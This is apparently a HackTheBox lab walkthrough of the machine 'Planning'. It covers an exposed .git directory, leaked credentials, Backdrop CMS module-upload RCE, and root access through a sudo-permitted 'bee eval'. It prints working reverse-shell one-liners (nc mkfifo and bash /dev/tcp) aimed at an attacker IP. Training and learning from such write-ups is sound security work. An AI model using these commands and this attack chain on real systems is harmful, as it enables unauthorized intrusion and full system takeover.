
# HTB Walkthrough — Machine: Planning

**Target IP:** `10.10.11.58`  
**Author:** Miguel Reis

## 1. Initial Scan

I began with a port scan to identify open services. It revealed SSH on port 22 and an Apache HTTP server on port 80.

![[Pasted image 20250613010742.png]]

## 2. Website Enumeration

Opening the site in the browser showed what appears to be a blog about dogs. What a surprise xD.

It also had a login page, i tried default credentials but didn’t work.

I followed up with an Nmap scan using the `-sC` flag for default scripts:

![[Pasted image 20250614162833.png]]

The results revealed a few key things:
- The web server is running **Backdrop CMS**
- A `.git/` directory is exposed
- The `robots.txt` file disallows access to **22 paths**, hinting at admin pages and hidden areas

> 📁 `.git/` – This suggests developers accidentally exposed the repository.  
> 📄 `robots.txt` – Good for discovering hidden admin paths.

I manually visited the disallowed paths and eventually found an interesting config file at:

```
http://10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
```

This file is part of Backdrop’s **configuration management system**, where site config (like URLs, settings, email, etc.) is stored in JSON format. Here, I found a user email address:

![[Pasted image 20250613021641.png]]

I also spotted references on other files suggesting the CMS version might be **1.27.1**, though not confirmed yet.

## 3. GIT Repository

Knowing the `.git/` directory was exposed, I used [git-dumper](https://github.com/arthaud/git-dumper) to retrieve the repository. This tool recursively downloads a Git repo when directory listing is available.

Once cloned, I inspected the files and found **credentials** in `settings.php`.

![[Pasted image 20250615005406.png]]

## 4. Backdrop CMS Access

Using the credentials found, I tried logging into the website with common usernames like `admin` and `root`, but no luck.

I then used the **email address** found earlier (`update.settings.json`) to guess a username: `tiffany` which worked. Giving access to the Backdrop CMS admin panel.

Under **Reports > Status Report**, I confirmed the Backdrop version as **1.27.1**:

![[Pasted image 20250615010655.png]]

## 5. RCE Exploit

Looking up vulnerabilities for Backdrop 1.27.1, I found [this exploit](https://www.exploit-db.com/exploits/52021), which abuses the **module installation feature** to achieve Remote Code Execution (RCE).
####  How the Exploit Works:
The exploit creates a malicious module archive (ZIP) containing PHP code. When installed via the admin panel, Backdrop extracts and runs it under `/modules/`, giving us access to a web shell.

I followed the instructions and went to:
`Functionality > Install new modules > Manual installation`

> ⚠️ **Note:**  
> Backdrop didn’t allow `.zip` uploads, so I re-compressed the exploit as a `tar.gz`.

After uploading, the shell became available at:

```
http://10.10.11.58/modules/shell/shell.php
```

![[Pasted image 20250615011859.png]]

## 6. Reverse Shell

To get a more stable and interactive shell, I upgraded to a reverse shell.

I started a listener on my machine:

```bash
nc -nvlp 8022
```

Then ran the following from the web shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.99 8022 >/tmp/f
```

Successfully getting the reverse shell

![[Pasted image 20250615012319.png]]

## 7. User Access

Enumerating the system, I found two users: `jobert` and `johncusack`. I tried the credentials from `settings.php` and successfully logged in as `johncusack` via SSH.

I could then retrieve the user flag on the home directory of the user.
## 8. Privilege Escalation

To escalate privileges, I ran `sudo -l` to check allowed commands:

![[Pasted image 20250615013000.png]]

Turns out I could run `/usr/local/bin/bee` as root. After some research i found it is a CLI tool for managing Backdrop CMS.

After running `bee help`, I found it includes the `eval` command — which can execute **arbitrary PHP code** on the server.

![[Pasted image 20250615013314.png]]

> ℹ️ **Note:**  
> The `bee` command must be run from within the Backdrop installation directory. I changed into `/var/www/html` before running it.

I tested it with a basic command and confirmed it worked:

![[Pasted image 20250615013943.png]]

## 9. Root Access

With `eval` working, I used it to trigger a reverse shell as root.

First, I started a listener:

```bash
nc -nvlp 8022
```

Then executed:

```bash
sudo /usr/local/bin/bee eval "system('bash -c \"bash -i >& /dev/tcp/10.10.14.5/8022 0>&1\"');"
```

Successfully getting root access to the machine.

---

## 🧠 Final Thoughts

This box was a great example of how multiple small misconfigurations like exposing the git repository, credential reuse, and over-permissive sudo rights can be chained together for a full system compromise.
